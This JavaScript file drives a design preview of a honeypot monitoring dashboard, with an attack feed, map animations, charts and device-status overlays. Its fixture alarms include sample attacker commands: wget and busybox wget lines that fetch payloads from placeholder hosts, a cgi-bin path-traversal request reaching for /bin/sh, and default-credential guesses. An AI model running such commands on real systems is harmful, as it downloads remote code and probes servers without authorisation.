"use strict";
const $ = (id) => document.getElementById(id);
const device = $("device");
const alarms = [
  {id:1,code:"de",country:"Germany",region:"Hesse / Frankfurt am Main",ip:"203.0.113.42",pot:"Cowrie",port:"22 / SSH",user:"root",password:"admin123",command:"uname -a; cat /etc/os-release\nwget http://198.51.100.9/payload.sh -O /tmp/.cache",asn:"AS64500 · Example Research Network",rep:"Known attacker (fixture)",time:"17:49:32"},
  {id:2,code:"us",country:"United States",region:"Virginia / Ashburn",ip:"198.51.100.81",pot:"Dionaea",port:"445 / SMB",user:"administrator",password:"Password1!",command:"SMB session setup / NTLM authentication attempt\nPayload: synthetic sample · 384 bytes",asn:"AS64501 · Example Cloud",rep:"Scanner (fixture)",time:"17:49:30"},
  {id:3,code:"jp",country:"Japan",region:"Tokyo / Chiyoda",ip:"2001:db8:42::7",pot:"Tanner",port:"80 / HTTP",user:"—",password:"—",command:"GET /cgi-bin/.%2e/.%2e/bin/sh HTTP/1.1\nUser-Agent: synthetic-security-demo/1.0",asn:"AS64502 · Example Transit",rep:"Unknown (fixture)",time:"17:49:26"},
  {id:4,code:"br",country:"Brazil",region:"São Paulo",ip:"192.0.2.107",pot:"Cowrie",port:"2222 / SSH",user:"support",password:"telecom2026",command:"id; whoami; busybox wget http://198.51.100.4/update",asn:"AS64503 · Example Provider",rep:"Brute force (fixture)",time:"17:49:22"},
  {id:5,code:"nl",country:"Netherlands",region:"North Holland / Amsterdam",ip:"203.0.113.87",pot:"Honeytrap",port:"445 / SMB",user:"guest",password:"guest",command:"Synthetic SMB connection / session probe",asn:"AS64504 · Example Hosting",rep:"Scanner (fixture)",time:"17:49:18"},
  {id:6,code:"sg",country:"Singapore",region:"Singapore",ip:"2001:db8:81::5",pot:"Tanner",port:"443 / HTTPS",user:"—",password:"—",command:"POST /api/login HTTP/1.1\n{\"username\":\"admin\",\"password\":\"fixture-only\"}",asn:"AS64505 · Example Datacenter",rep:"Unknown (fixture)",time:"17:49:15"},
];
let selected = 1, follow = true, page = "Overview", timeframe = "1h", overlay = null;
let demo = false, paused = false, fitted = true;
let selection = {size:1280};
const counts = {"1m":42,"15m":762,"1h":3186,"24h":28641};
const potColors = {Cowrie:"#e20074",Dionaea:"#eda74c",Tanner:"#78cddd",Honeytrap:"#a48bec"};
const countryColors = ["#e20074","#eda74c","#78cddd","#a48bec"];
const countryCounts = [1268,872,465,318];
const potCounts = [1482,908,465,331];
const potNames = ["Cowrie","Dionaea","Tanner","Honeytrap"];
const alarmTemplates = alarms.map(alarm=>({...alarm}));
let pendingMapEvents = [], newAlarmIndex = 0;
function formatCount(value) {
  if(selection.size!==800)return value.toLocaleString("en-US");
  for(const [threshold,suffix] of [[1e6,"M"],[1e3,"K"]]){
    if(value>=threshold){
      const rounded=Number((value/threshold).toFixed(value<threshold*10?1:0));
      return rounded===1000&&suffix==="K"?"1M":rounded+suffix;
    }
  }
  return String(value);
}
function currentAlarm() { return alarms.find(item=>item.id===selected); }
function escape(value) {
  return String(value).replace(/[&<>"']/g, (char) => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[char]));
}
function button(text,action,extra="") { return `<button data-action="${action}" ${extra}>${text}</button>`; }
function header() {
  const battery = $("battery").value, wifi = $("wifi").value;
  const unknown = battery === "unknown", charging = battery === "charge", percent = charging ? 86 : Number(battery);
  const signal = wifi === "unknown" ? null : Number(wifi);
  return `<header class="top">
    <div class="brand"><img src="../../images/telekom-logo-magenta.svg" alt="Telekom"><strong>T-POT MOBILE</strong><span class="version">dev-24.04.2</span></div>
    <span class="publicIp"><small>PUBLIC IP</small><strong class="mono">198.51.100.10</strong></span>
    ${button("◇","fixture",'class="iconButton fixtureBadge" title="Synthetic development preview" aria-label="Fixture information"')}
    ${button(follow?"◉":"Ⅱ","follow",`class="iconButton followIcon" title="${follow?"Following live events":"Selection held; resume live following"}" aria-label="Follow live"`)}
    ${demo?button(paused?"Ⅱ":"▷","presentationInfo",'class="iconButton" aria-label="Presentation status"'): ""}
    <button class="iconButton wifiButton" data-action="wifi" aria-label="Wi-Fi details" title="Wi-Fi details"><svg viewBox="0 0 32 32" aria-hidden="true"><path d="M4 13A17 17 0 0 1 28 13" class="${signal>65?"on":""}"/><path d="M8 18A11.3 11.3 0 0 1 24 18" class="${signal>35?"on":""}"/><path d="M12 23A5.7 5.7 0 0 1 20 23" class="${signal>0?"on":""}"/><circle cx="16" cy="28" r="1.6" class="${signal>0?"on":""}"/>${signal===null||signal===0?'<path class="alert" d="M5 5L27 29"/>':""}</svg></button>
    <button class="iconButton batteryButton ${charging?"charging":""} ${!unknown&&percent<10?"critical":""}" data-action="battery" aria-label="${charging?"Battery charging; details":"Battery details"}" title="${charging?"Charging":"Battery details"}"><span class="batteryIcon"><i style="width:${unknown?0:percent}%"></i>${unknown?"<b>?</b>":charging?'<svg class="chargeIcon" viewBox="0 0 14 14" aria-hidden="true"><path d="M7 12V2M3 6l4-4 4 4"/></svg>':""}</span></button>
    <time class="clock mono" id="clock"></time>
  </header>`;
}
function detailBody(expanded=false) {
  const alarm = currentAlarm();
  const field = (label,value,cls="")=>`<div class="field ${cls}"><label>${label}</label><p class="mono">${escape(value)}</p></div>`;
  if(selection.size===800&&!expanded){
    return `<div class="details compactDetails"><div class="country"><img class="flag" src="../../flags/${alarm.code}.png" alt="${alarm.country}"><strong>${alarm.country}</strong><span class="potBadge" style="--pot:${potColors[alarm.pot]}">${alarm.pot}</span></div><div class="detailGrid">
      ${field("Source IP",alarm.ip)}${field("Service",alarm.port)}
      ${field("Reputation",alarm.rep.replace(" (fixture)",""),"wide reputation")}
      ${field("Username",alarm.user,"credentials")}${field("Password",alarm.password,"credentials")}
      <button class="commandPreview wide" data-action="details" aria-label="Open full alarm details"><span>COMMAND / REQUEST <b>DETAILS ↗</b></span><code>${escape(alarm.command.split("\n")[0])}</code></button>
    </div></div>`;
  }
  return `<div class="details"><div class="country"><img class="flag" src="../../flags/${alarm.code}.png" alt="${alarm.country}"><div><strong>${alarm.country}</strong><small>${alarm.region}</small></div><span class="potBadge" style="--pot:${potColors[alarm.pot]}" >${alarm.pot}</span></div>
    <div class="detailGrid">${field("Source IP",alarm.ip)}${field("Service",alarm.port)}
    ${field("IP Reputation",alarm.rep,"reputation")}${field("Geo coordinates",geo(alarm).label)}
    ${field("Username",alarm.user,"credentials")}${field("Password",alarm.password,"credentials")}
    <div class="field wide"><label>Command / Request · plain text</label><div class="command">${escape(alarm.command)}</div></div>
    ${field("ASN / Organization",alarm.asn)}${field("Timestamp","2026-10-31 "+alarm.time+" CET")}</div></div>`;
}
function detailPanel() { return `<section class="panel detailPanel" style="--pot:${potColors[currentAlarm().pot]}"><div class="panelTitle"><span>ALARM INTELLIGENCE</span>${button(follow?"◉ LIVE":"Ⅱ HELD","follow",'class="liveControl" aria-label="Follow live"')}</div>${detailBody()}</section>`; }
function feedPanel() {
  return `<section class="panel feedPanel ${page==="Events"?"expandedFeed":""}"><div class="panelTitle"><span>${page==="Events"?"EVENT INTELLIGENCE":"ATTACK STREAM"}</span><span>${alarms.length} FIXTURES</span></div><div class="feed">${alarms.map((alarm)=>`<button class="alarm ${selected===alarm.id ? "selected" : ""}" style="--pot:${potColors[alarm.pot]}" data-alarm="${alarm.id}" aria-label="Alarm ${alarm.pot} ${alarm.country}"><img class="flag" src="../../flags/${alarm.code}.png" alt=""><div class="alarmText"><div class="eventHeading"><strong>${alarm.pot} / ${alarm.port.split(" / ")[1]}</strong><time class="mono">${alarm.time}</time></div><small>${alarm.country} · <span class="mono">${alarm.ip}</span></small><span class="eventRep">${alarm.rep.replace(" (fixture)","")}</span>${page==="Events"?`<span class="eventCommand mono">${escape(alarm.command.split("\n")[0])}</span>`:""}</div></button>`).join("")}</div></section>`;
}
function chartPanel() {
  return `<section class="panel chartPanel" data-action="chart" role="button" tabindex="0" aria-label="Expand Activity"><div class="panelTitle"><span>ACTIVITY / LAST ${timeframe}</span><span>↗ EXPAND</span></div><canvas class="chart" aria-label="Events with time grid"></canvas></section>`;
}
function body() {
  if (page==="Events") return `<div class="body">${feedPanel()}</div>`;
  if (page==="System") return `<div class="body"><section class="panel">${systems()}</section></div>`;
  if (page==="Map") return mapBody();
  if (page==="Tops") return topsBody();
  return `<div class="body layoutC">${detailPanel()}<div class="rightColumn">${feedPanel()}${chartPanel()}</div></div>`;
}
function geo(alarm) {
  const coords={de:[50.11,8.68],us:[38.9,-77.04],jp:[35.68,139.76],br:[-23.55,-46.63],nl:[52.37,4.90],sg:[1.35,103.82]};
  const [lat,lon]=coords[alarm.code];
  return {lat,lon,label:`${Math.abs(lat).toFixed(2)}° ${lat<0?"S":"N"} / ${Math.abs(lon).toFixed(2)}° ${lon<0?"W":"E"}`};
}
function mapPoint(latitude,longitude) {
  const merc=lat=>Math.log(Math.tan(Math.PI/4+lat*Math.PI/360));
  return {x:(longitude+180)/360*1280,y:(1-(merc(latitude)-merc(-64))/(merc(80)-merc(-64)))*794};
}
function mapBody() {
  const point=alarm=>{const g=geo(alarm);return mapPoint(g.lat,g.lon);};
  const sensor=mapPoint(48.14,11.58);
  const locations=new Map();
  for(const alarm of alarms){
    const g=geo(alarm),key=g.lat+","+g.lon;
    if(locations.has(key))locations.get(key).count++;
    else locations.set(key,{alarm,count:1});
  }
  return `<div class="fullMap"><svg class="worldMap" viewBox="0 0 1280 794" preserveAspectRatio="xMidYMid meet" role="img" aria-label="World map with synthetic attacks"><image href="../../images/map_1280794.png" width="1280" height="794"/>
    ${[...locations.values()].map(({alarm,count})=>{const p=point(alarm);return `<g class="mapMarker" data-alarm="${alarm.id}" tabindex="0" role="button" aria-label="${alarm.pot} ${alarm.country}, ${count} events"><circle cx="${p.x}" cy="${p.y}" r="24" fill="${potColors[alarm.pot]}" opacity=".17"/><circle cx="${p.x}" cy="${p.y}" r="7" fill="${potColors[alarm.pot]}"/><circle cx="${p.x}" cy="${p.y}" r="16" fill="none" stroke="${potColors[alarm.pot]}"/><text x="${p.x+22}" y="${p.y+5}">${alarm.pot}${count>1?" · "+count:""}</text><circle class="markerHit" cx="${p.x}" cy="${p.y}" r="32" fill="transparent" pointer-events="all"/></g>`;}).join("")}
    <g class="sensor"><rect x="${sensor.x-6}" y="${sensor.y-6}" width="12" height="12" fill="#ffffff"/><text x="${sensor.x+22}" y="${sensor.y+32}">SENSOR · FIXTURE</text></g><g id="mapEffects" aria-hidden="true"></g></svg>
    <div class="mapHeading"><span>GLOBAL ATTACK RADAR <small>FIXTURE</small></span>${button("← Back","mapBack",'aria-label="Leave map"')}</div>
    <div class="mapEventStrip">${alarms.slice(0,selection.size===800?2:3).map(alarm=>`<button class="mapEvent" data-alarm="${alarm.id}" style="--pot:${potColors[alarm.pot]}"><img class="flag" src="../../flags/${alarm.code}.png" alt=""><span><span class="eventHeading"><strong>${alarm.pot} / ${alarm.port.split(" / ")[1]}</strong><time>${alarm.time}</time></span><small class="mono">${alarm.ip}</small><small>${alarm.rep.replace(" (fixture)","")}</small></span></button>`).join("")}</div>
    <div class="mapLegend">RECENT GEOLOCATED EVENTS · Tap a marker or event for details</div></div>`;
}
function frameButtons() { return `<div class="timeframes">${Object.keys(counts).map(frame=>button(frame,"frame",`data-frame="${frame}" class="${frame===timeframe?"active":""}"`)).join("")}</div>`; }
function distributionValues(weights) {
  return weights.map(value=>Math.round(value*counts[timeframe]/counts["1h"]));
}
function topsBody() {
  const groups=[
    {title:"ORIGIN COUNTRIES / TOP 4",values:distributionValues(countryCounts),names:["Germany","United States","Japan","Brazil"],colors:countryColors},
    {title:"HONEYPOT DISTRIBUTION",values:distributionValues(potCounts),names:potNames,colors:potNames.map(name=>potColors[name])},
  ];
  return `<div class="topsHeading"><span>THREAT DISTRIBUTION · LAST ${timeframe}</span>${frameButtons()}</div><div class="body topsGrid">${groups.map((group,index)=>`<section class="panel donutPanel"><div class="panelTitle">${group.title}</div><div class="distribution"><canvas class="donut" data-group="${index}" aria-label="${group.title}: ${group.names.map((n,i)=>n+" "+group.values[i]).join(", ")}"></canvas><div class="legend">${group.names.map((name,i)=>`<div style="--pot:${group.colors[i]}">${index?`<i style="background:${group.colors[i]}"></i>`:`<img class="legendFlag" src="../../flags/${["de","us","jp","br"][i]}.png" alt="${name}">`}<span>${name}</span><strong class="mono" title="${group.values[i].toLocaleString("en-US")}">${formatCount(group.values[i])}</strong></div>`).join("")}</div></div></section>`).join("")}<section class="panel portPanel"><div class="panelTitle">TARGET SERVICES / TOP PORTS</div><div class="serviceBars">${["SSH / 22","SMB / 445","HTTP / 80","SSH / 2222"].map((name,i)=>`<div><span>${name}</span><div class="barTrack"><i style="width:${[100,61,31,22][i]}%;background:${countryColors[i]}"></i></div><strong class="mono" title="${distributionValues(potCounts)[i].toLocaleString("en-US")}">${formatCount(distributionValues(potCounts)[i])}</strong></div>`).join("")}</div></section></div>`;
}
function systems() {
  return `<div class="panelTitle">SYSTEM / PRESENTATION & DEVICE STATUS</div><div class="systems"><div><h3>PRESENTATION</h3><p>Live views rotate every 20 seconds. Touch pauses rotation. No synthetic alarms in production mode.</p>${button(demo?"Disable demo":"Enable demo","demo")}${demo && paused ? button("Resume rotation","resume") : ""}<h3>DISPLAY</h3><p>Battery brightness is capped at 60%. Manual overrides last until the next power-source change.</p><label>Brightness (simulation)<input type="range" min="5" max="100" value="60" aria-label="Simulated brightness"></label></div><div><h3>DEVICE TELEMETRY · FIXTURE</h3><p class="mono">CPU 12.5% · 48.5 °C<br>RAM 3.6 / 8 GB<br>POWER 6.20 W · 7.70 V<br>PUBLIC IP 198.51.100.10<br>Cowrie / Dionaea / Elasticsearch: healthy</p>${button("Boot preview","boot")}<p>All status values are simulated. No power or performance guarantees.</p></div></div>`;
}
function overlayContent() {
  if (overlay==="details") return `<div class="overlay"><div class="overlayHeader"><h2>ALARM DETAILS</h2>${button("Follow live","follow")}${button("Back","close")}</div><section class="panel">${detailBody(true)}</section></div>`;
  if (overlay==="chart") return `<div class="overlay chartOverlay"><div class="overlayHeader"><h2>ACTIVITY / LAST ${timeframe}</h2><div class="chartToolbar">${frameButtons()}<span class="toolbarDivider" aria-hidden="true"></span>${button("Back","close")}</div></div><section class="panel"><canvas class="chart" aria-label="Synthetic event histogram with time grid"></canvas></section></div>`;
  if (overlay==="boot") return `<div class="overlay boot"><canvas id="splash" aria-label="Canonical T-Pot ANSI honeycomb logo"></canvas><h2>T-POT MOBILE / DEV-24.04.2</h2><p class="mono">✓ Display & touch ready · ✓ UI ready<br>⟳ Elasticsearch starting · Honeypots starting</p>${button("Open UI","close")}<p>Startup states are simulated. No artificial countdown in production.</p></div>`;
  if (["battery","wifi","fixture","presentationInfo"].includes(overlay)) {
    const battery=$("battery").value,wifi=$("wifi").value;
    const status={
      battery:{title:"BATTERY / UPS",text:battery==="unknown"?"Sensor unavailable. No automatic brightness or shutdown decisions.":`Estimated charge: ${battery==="charge"?"86":battery}%\n${battery==="charge"?"Charging":"Discharging"} · 6.20 W · 7.70 V\n${battery==="8"?"Critical battery level (simulation only).":"Voltage-based estimate, not a calibrated fuel gauge."}`},
      wifi:{title:"WI-FI / NETWORK",text:wifi==="unknown"?"Wi-Fi signal unknown.":wifi==="0"?"Wi-Fi disconnected. No internet connection.":`Wi-Fi signal quality: ${wifi}%\n${wifi==="82"?"Strong":"Weak"} connection · wlan0\nPublic IP 198.51.100.10 · Local IP 192.0.2.10`},
      fixture:{title:"DESIGN PREVIEW",text:"All alarms, credentials and status values are synthetic.\ndev-24.04.2 · No hardware actions.\nThis preview is also labelled as a fixture outside the simulated screen."},
      presentationInfo:{title:"PRESENTATION",text:paused?"Rotation paused by touch. Resume under System.":"Live views rotate every 20 seconds. Touch pauses rotation."},
    }[overlay];
    return `<div class="overlay statusOverlay"><div class="statusCard"><h2>${status.title}</h2><p>${escape(status.text)}</p>${button("Close","close")}</div></div>`;
  }
  return "";
}
function render() {
  for(const animation of device.getAnimations({subtree:true}))animation.cancel();
  device.className=(selection.size===800?"small ":"")+(page==="Map"?"mapMode":"");
  device.style.width=selection.size+"px"; device.style.height=(selection.size===800?480:800)+"px";
  const counters=page==="Overview"?`<div class="counters">${Object.entries(counts).map(([frame,count])=>`<button class="counter ${timeframe===frame?"active":""}" data-frame="${frame}" data-action="frame"><small>LAST ${frame}</small><strong class="mono" title="${count.toLocaleString("en-US")}">${formatCount(count)}</strong></button>`).join("")}</div>`:"";
  device.innerHTML=(page==="Map"?"":header())+counters+body()+(page==="Map"?"":`<nav class="nav">${["Overview","Map","Events","Tops","System"].map((name)=>button(name,"page",`data-page="${name}" class="${name===page?"active":""}"`)).join("")}</nav>`)+overlayContent();
  fit(); clock(); requestAnimationFrame(()=>{draw();layoutMapLabels();animateMap();});
}
function layoutMapLabels() {
  const placed=[];
  for(const label of device.querySelectorAll(".worldMap text")){
    let bounds=label.getBBox();
    for(let attempt=0;attempt<8&&placed.some(other=>bounds.x<other.x+other.width+6&&bounds.x+bounds.width+6>other.x&&bounds.y<other.y+other.height+6&&bounds.y+bounds.height+6>other.y);attempt++){
      label.setAttribute("y",Number(label.getAttribute("y"))+34);
      bounds=label.getBBox();
    }
    placed.push(bounds);
  }
}
function animateMap() {
  const effects=$("mapEffects");
  const incoming=pendingMapEvents.slice(-3);
  pendingMapEvents=[];
  if(!effects||overlay||window.matchMedia("(prefers-reduced-motion: reduce)").matches)return;
  const ns="http://www.w3.org/2000/svg",sensor=mapPoint(48.14,11.58);
  for(const alarm of incoming){
    const location=geo(alarm),source=mapPoint(location.lat,location.lon);
    const group=document.createElementNS(ns,"g");
    group.classList.add("attackEffect");
    const path=document.createElementNS(ns,"path");
    const bend=Math.min(170,Math.abs(source.x-sensor.x)*.3+45);
    path.setAttribute("d",`M ${source.x} ${source.y} Q ${(source.x+sensor.x)/2} ${Math.min(source.y,sensor.y)-bend} ${sensor.x} ${sensor.y}`);
    path.setAttribute("fill","none");path.setAttribute("stroke",potColors[alarm.pot]);path.setAttribute("stroke-width","3");
    group.append(path);effects.append(group);
    const length=path.getTotalLength();
    path.style.strokeDasharray=`${length*.12} ${length}`;
    const flight=path.animate([{strokeDashoffset:String(length*.12),opacity:0},{strokeDashoffset:"0",opacity:1,offset:.12},{strokeDashoffset:String(-length),opacity:0}],{duration:1100,easing:"ease-out"});
    const animations=[flight];
    for(const [point,delay] of [[source,0],[sensor,700]]){
      const ring=document.createElementNS(ns,"circle");
      ring.setAttribute("cx",point.x);ring.setAttribute("cy",point.y);ring.setAttribute("r","20");
      ring.setAttribute("fill","none");ring.setAttribute("stroke",potColors[alarm.pot]);ring.setAttribute("stroke-width","2");
      ring.classList.add("attackPing");group.append(ring);
      animations.push(ring.animate([{transform:"scale(.25)",opacity:.9},{transform:"scale(2.2)",opacity:0}],{duration:650,delay,fill:"both"}));
    }
    let remaining=animations.length;
    for(const animation of animations)animation.onfinish=()=>{if(--remaining===0)group.remove();};
  }
}
function fit() {
  const scale=fitted ? Math.min(1,($("stage").clientWidth-2)/selection.size) : 1;
  device.style.transform=`scale(${scale})`;
  $("stage").style.height=((selection.size===800?480:800)*scale+22)+"px";
}
function clock() {
  if (!$("clock")) return;
  const now=new Date();
  $("clock").textContent=now.toLocaleTimeString("en-GB",{hour12:false});
}
function draw() {
  device.querySelectorAll("canvas.donut").forEach(canvas=>{
    const index=Number(canvas.dataset.group),values=distributionValues(index?potCounts:countryCounts);
    const colors=index?potNames.map(name=>potColors[name]):countryColors;
    const w=canvas.clientWidth,h=canvas.clientHeight;canvas.width=w*2;canvas.height=h*2;
    const ctx=canvas.getContext("2d");ctx.scale(2,2);
    const radius=Math.min(w,h)*.42,total=values.reduce((a,b)=>a+b,0);let start=-Math.PI/2;
    values.forEach((value,i)=>{const end=start+value/total*Math.PI*2;ctx.beginPath();ctx.arc(w/2,h/2,radius,start+.025,end-.025);ctx.lineWidth=radius*.35;ctx.strokeStyle=colors[i];ctx.stroke();start=end;});
    ctx.textAlign="center";ctx.fillStyle="#eee9f1";ctx.font=`500 ${selection.size===800?22:32}px monospace`;ctx.fillText(formatCount(total),w/2,h/2+4);
    ctx.font=`${selection.size===800?11:13}px system-ui`;ctx.fillStyle="#ada6b5";ctx.fillText("EVENTS",w/2,h/2+26);
  });
  device.querySelectorAll("canvas.chart").forEach((canvas)=>{
    const w=canvas.clientWidth,h=canvas.clientHeight;
    canvas.width=w*2; canvas.height=h*2;
    const ctx=canvas.getContext("2d"); ctx.scale(2,2);
    const left=40,right=w-12,top=12,bottom=h-32;
    ctx.font=`${selection.size===800?11:13}px monospace`; ctx.strokeStyle="#37303f"; ctx.fillStyle="#b5a7b8"; ctx.lineWidth=.5;
    for(let i=0;i<=4;i++){
      const y=top+(bottom-top)*i/4;
      ctx.beginPath();ctx.moveTo(left,y);ctx.lineTo(right,y);ctx.stroke();
      ctx.textAlign="left";ctx.fillText(String((4-i)*30),3,y+3);
    }
    const span={"1m":60,"15m":900,"1h":3600,"24h":86400}[timeframe];
    const end=new Date("2026-10-31T17:49:00+01:00");
    const markers=w<420?2:4;
    for(let i=0;i<=markers;i++){
      const x=left+(right-left)*i/markers;
      ctx.beginPath();ctx.moveTo(x,top);ctx.lineTo(x,bottom);ctx.stroke();
      const value=new Date(end.getTime()-span*1000*(1-i/markers));
      const label=value.toLocaleTimeString("en-GB",{hour:"2-digit",minute:"2-digit",hour12:false,timeZone:"Europe/Berlin"});
      ctx.textAlign=i===markers?"right":i===0?"left":"center";ctx.fillText(label,x,h-12);
    }
    ctx.fillStyle="#e20074";
    const step=(right-left)/60;
    for(let i=0;i<60;i++){
      const value=Math.max(1,Math.sin(i*.45)*35+Math.cos(i*.21)*24+40);
      const height=value/120*(bottom-top);
      ctx.fillRect(left+i*step+1,bottom-height,Math.max(1,step-2),height);
    }
  });
  if ($("splash")) {
    if(!window.tpotSplash) { $("splash").replaceWith(document.createTextNode("ANSI asset missing: run python3 tools/design/build_splash.py")); return; }
    const grid=window.tpotSplash.grids[selection.size===800?"80x24":"120"];
    const canvas=$("splash");canvas.width=grid.width;canvas.height=grid.height;
    const ctx=canvas.getContext("2d");
    grid.pixels.forEach((pixel,index)=>{
      if(!pixel)return;
      ctx.fillStyle=`rgb(${window.tpotSplash.palette[pixel].join(",")})`;
      ctx.fillRect(index%grid.width,Math.floor(index/grid.width),1,1);
    });
  }
}
device.addEventListener("pointerdown",()=>{if(demo)paused=true;});
device.addEventListener("click",(event)=>{
  const target=event.target.closest("[data-action],[data-alarm]");
  if(!target)return;
  if(target.dataset.alarm){
    selected=Number(target.dataset.alarm);follow=false;
    if(page==="Events"||page==="Map")overlay="details";
  }else{
    switch(target.dataset.action){
      case "page":page=target.dataset.page;overlay=null;if(page==="Map")pendingMapEvents=alarms.slice(0,3);break;
      case "frame":timeframe=target.dataset.frame;break;
      case "chart":overlay="chart";break;
      case "close":overlay=null;break;
      case "follow":follow=true;selected=alarms[0].id;break;
      case "demo":demo=!demo;paused=false;break;
      case "resume":paused=false;break;
      case "boot":overlay="boot";break;
      case "mapBack":page="Overview";overlay=null;break;
      case "details":overlay="details";break;
      case "battery":case "wifi":case "fixture":case "presentationInfo":overlay=target.dataset.action;break;
    }
  }
  render();
});
device.addEventListener("keydown",(event)=>{
  if(event.key==="Escape"&&overlay){overlay=null;render();return;}
  if(event.target.matches('[role="button"]')&&(event.key==="Enter"||event.key===" ")){event.preventDefault();event.target.click();}
});
["size","battery","wifi"].forEach((id)=>$(id).addEventListener("change",()=>{
  selection={size:Number($("size").value)};overlay=null;render();
}));
$("newAlarm").onclick=()=>{
  const template=alarmTemplates[(++newAlarmIndex)%alarmTemplates.length], next={...template,id:Math.max(...alarms.map((item)=>item.id))+1,time:new Date().toLocaleTimeString("en-GB",{hour12:false}),user:"admin",password:"fixture-only",command:"echo 'new synthetic attack'; id"};
  alarms.unshift(next);if(alarms.length>12)alarms.pop();
  if(follow)selected=next.id;
  if(!alarms.some((alarm)=>alarm.id===selected)){selected=alarms[0].id;follow=true;}
  if(page==="Map"&&!overlay)pendingMapEvents=[next];
  render();
};
$("bootButton").onclick=()=>{overlay="boot";render();};
$("trueSize").onclick=()=>{fitted=!fitted;fit();};
window.addEventListener("resize",()=>{fit();draw();});
setInterval(clock,1000);
setInterval(()=>{if(demo&&!paused&&!overlay){const pages=["Overview","Map","Events","Tops","System"];page=pages[(pages.indexOf(page)+1)%5];render();}},20000);
const params=new URLSearchParams(location.search);
if(params.get("size")==="800")$("size").value="800";
selection={size:Number($("size").value)};
if(["Overview","Map","Events","Tops","System"].includes(params.get("page")))page=params.get("page");
if(page==="Map")pendingMapEvents=alarms.slice(0,3);
if(params.get("boot")==="1")overlay="boot";
render();
